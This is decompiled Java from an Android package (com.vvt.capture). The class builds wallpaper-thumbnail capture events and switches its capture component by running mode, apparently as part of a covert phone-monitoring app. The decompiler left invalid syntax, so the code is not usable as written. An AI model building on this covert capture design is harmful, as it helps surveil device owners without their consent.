package com.vvt.capture.f;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.capture.f.a.f;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxWallPaperThumbnailEvent;

public class c
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private com.vvt.capture.f.a.a c;
  private com.vvt.capture.f.b.a d;
  private Context e;
  private a f;
  
  public c(String paramString, RunningMode paramRunningMode, Context paramContext, com.vvt.base.a parama)
  {
    Object localObject = new com/vvt/capture/f/d;
    ((d)localObject).<init>(this);
    this.f = ((a)localObject);
    this.b = parama;
    this.e = paramContext;
    localObject = RunningMode.FULL;
    int i;
    int j;
    a locala;
    if (paramRunningMode == localObject)
    {
      i = 1;
      j = i;
      if (j == 0) {
        break label114;
      }
      localObject = new com/vvt/capture/f/a/c;
      locala = this.f;
      ((com.vvt.capture.f.a.c)localObject).<init>(locala);
      label73:
      this.c = ((com.vvt.capture.f.a.a)localObject);
      if (j == 0) {
        break label135;
      }
      localObject = new com/vvt/capture/f/b/b;
      ((com.vvt.capture.f.b.b)localObject).<init>(paramString);
    }
    for (;;)
    {
      this.d = ((com.vvt.capture.f.b.a)localObject);
      return;
      i = 0;
      localObject = null;
      j = 0;
      break;
      label114:
      localObject = new com/vvt/capture/f/a/f;
      locala = this.f;
      ((f)localObject).<init>(locala);
      break label73;
      label135:
      localObject = new com/vvt/capture/f/b/c;
      ((com.vvt.capture.f.b.c)localObject).<init>(paramString);
    }
  }
  
  private FxWallPaperThumbnailEvent a(b paramb)
  {
    FxWallPaperThumbnailEvent localFxWallPaperThumbnailEvent = new com/vvt/events/FxWallPaperThumbnailEvent;
    localFxWallPaperThumbnailEvent.<init>();
    long l = paramb.b();
    localFxWallPaperThumbnailEvent.setActualSize(l);
    l = paramb.e();
    localFxWallPaperThumbnailEvent.setEventTime(l);
    Object localObject = paramb.a();
    localFxWallPaperThumbnailEvent.setFormat((FxMediaType)localObject);
    localObject = paramb.c();
    localFxWallPaperThumbnailEvent.setActualFullPath((String)localObject);
    localObject = paramb.d();
    localFxWallPaperThumbnailEvent.setThumbnailFullPath((String)localObject);
    return localFxWallPaperThumbnailEvent;
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    com.vvt.capture.f.a.a locala = this.c;
    if (locala != null)
    {
      locala = this.c;
      Context localContext = this.e;
      locala.a(localContext);
    }
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    com.vvt.capture.f.a.a locala = this.c;
    if (locala != null)
    {
      locala = this.c;
      Context localContext = this.e;
      locala.b(localContext);
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */